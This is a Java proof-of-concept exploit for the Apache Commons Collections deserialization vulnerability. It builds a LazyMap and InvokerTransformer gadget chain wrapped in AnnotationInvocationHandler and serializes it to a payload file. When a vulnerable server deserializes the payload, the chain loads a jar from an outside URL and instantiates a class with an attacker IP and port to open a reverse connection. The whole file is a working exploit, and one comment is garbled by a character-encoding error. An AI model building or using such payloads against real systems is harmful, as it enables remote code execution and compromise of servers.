package ApacheCommonsCollections;

import java.io.File;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

/*
 * code from https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/
 * ÀûÓÃlazymapµÄpoc
 */
public class lazymapPoc{
	public InvocationHandler getObject(final String ip) throws Exception {
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[] { new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(java.net.URLClassLoader.class),
				// getConstructor class.class classname
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { java.net.URL[].class } }),
				// newinstance string http://www.iswin.org/attach/iswin.jar
				new InvokerTransformer(
						"newInstance",
						new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(
								"http://www.iswin.org/attach/iswin.jar") } } }),
				// loadClass String.class R
				new InvokerTransformer("loadClass",
						new Class[] { String.class }, new Object[] { "R" }),
				// set the target reverse ip and port
				new InvokerTransformer("getConstructor",
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }),
				// invoke
				new InvokerTransformer("newInstance",
						new Class[] { Object[].class },
						new Object[] { new String[] { ip } }),
				new ConstantTransformer(1) };
		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		//this will generate a AnnotationInvocationHandler(Override.class,lazymap) invocationhandler
		InvocationHandler invo = (InvocationHandler) getFirstCtor(
				"sun.reflect.annotation.AnnotationInvocationHandler")
				.newInstance(Retention.class, lazyMap);
		//generate object which implements specifiy interface 
		final Map mapProxy = Map.class.cast(Proxy.newProxyInstance(this
				.getClass().getClassLoader(), new Class[] { Map.class }, invo));
		
		final InvocationHandler handler = (InvocationHandler) getFirstCtor(
				"sun.reflect.annotation.AnnotationInvocationHandler")
				.newInstance(Retention.class, mapProxy);
		setFieldValue(transformerChain, "iTransformers", transformers);
		return handler;
	}
	public static Constructor<?> getFirstCtor(final String name)
			throws Exception {
		final Constructor<?> ctor = Class.forName(name)
				.getDeclaredConstructors()[0];
		ctor.setAccessible(true);
		return ctor;
	}
	public static Field getField(final Class<?> clazz, final String fieldName)
			throws Exception {
		Field field = clazz.getDeclaredField(fieldName);
		if (field == null && clazz.getSuperclass() != null) {
			field = getField(clazz.getSuperclass(), fieldName);
		}
		field.setAccessible(true);
		return field;
	}
	public static void setFieldValue(final Object obj, final String fieldName,
			final Object value) throws Exception {
		final Field field = getField(obj.getClass(), fieldName);
		field.set(obj, value);
	}
	public static void main(final String[] args) throws Exception {
		final Object objBefore = lazymapPoc.class.newInstance()
				.getObject("10.18.180.34:8080");
		//deserialize(serialize(objBefore));
		
		File f = new File("/Users/iswin/Downloads/payloadsfinal.bin");
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
		out.writeObject(objBefore);
		out.flush();
		out.close();
	}
}